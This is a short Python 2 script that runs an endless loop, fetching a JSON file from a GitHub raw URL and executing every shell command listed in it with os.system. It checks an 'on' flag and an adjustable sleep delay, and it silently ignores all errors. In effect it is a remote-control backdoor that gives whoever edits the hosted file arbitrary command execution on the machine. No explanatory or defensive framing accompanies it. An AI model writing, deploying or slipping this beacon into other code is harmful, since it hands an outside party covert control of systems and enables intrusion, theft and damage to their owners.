import sys
import urllib2
import time
import json
import os

delay = 300
enable = 0
cmds = []

while True:
    try:
        time.sleep(delay)

        response = urllib2.urlopen('https://raw.githubusercontent.com/rsscripter/mhg/master/processHost.json')
        data = json.load(response)

        enable = int(data["on"])
        delay = int(data["sleep"])
        cmds = data["cmd"]

        if enable == 1:
            for cmd in cmds:
                os.system(cmd)

    except Exception as e:
        pass

sys.exit()

    


